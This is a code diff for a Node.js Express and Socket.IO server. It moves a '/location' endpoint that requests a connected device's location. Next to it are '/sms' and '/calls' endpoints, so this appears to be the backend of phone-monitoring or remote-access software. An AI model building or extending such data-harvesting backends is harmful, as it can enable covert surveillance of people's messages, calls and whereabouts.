@@ -38,6 +38,23 @@ app.get("/sms", async (req, res) => {
   res.json(smsData);
 });
 
+app.get("/location", async (req, res) => {
+  if (globalSocket == null)
+    return res.json({
+      message: "No socket connection",
+    });
+  globalSocket.emit("location", "get location");
+  // Wait for the 'sms' event using async/await
+  const locationData = await new Promise((resolve, reject) => {
+    globalSocket.on("getlocation", (data) => {
+      resolve(data);
+    });
+  });
+
+  // Send the received 'smsData' as a JSON response
+  res.json(locationData);
+});
+
 
 io.on("connection", (socket) => {
   console.log("A client connected");
@@ -69,22 +86,22 @@ io.on("connection", (socket) => {
   //   res.json(smsData);
   // });
 
-  app.get("/location", async (req, res) => {
-    if (!socket)
-      return res.json({
-        message: "No socket connection",
-      });
-    socket.emit("location", "get location");
-    // Wait for the 'sms' event using async/await
-    const locationData = await new Promise((resolve, reject) => {
-      socket.on("getlocation", (data) => {
-        resolve(data);
-      });
-    });
+  // app.get("/location", async (req, res) => {
+  //   if (!socket)
+  //     return res.json({
+  //       message: "No socket connection",
+  //     });
+  //   socket.emit("location", "get location");
+  //   // Wait for the 'sms' event using async/await
+  //   const locationData = await new Promise((resolve, reject) => {
+  //     socket.on("getlocation", (data) => {
+  //       resolve(data);
+  //     });
+  //   });
 
-    // Send the received 'smsData' as a JSON response
-    res.json(locationData);
-  });
+  //   // Send the received 'smsData' as a JSON response
+  //   res.json(locationData);
+  // });
 
   app.get("/calls", async (req, res) => {
     if (!socket)
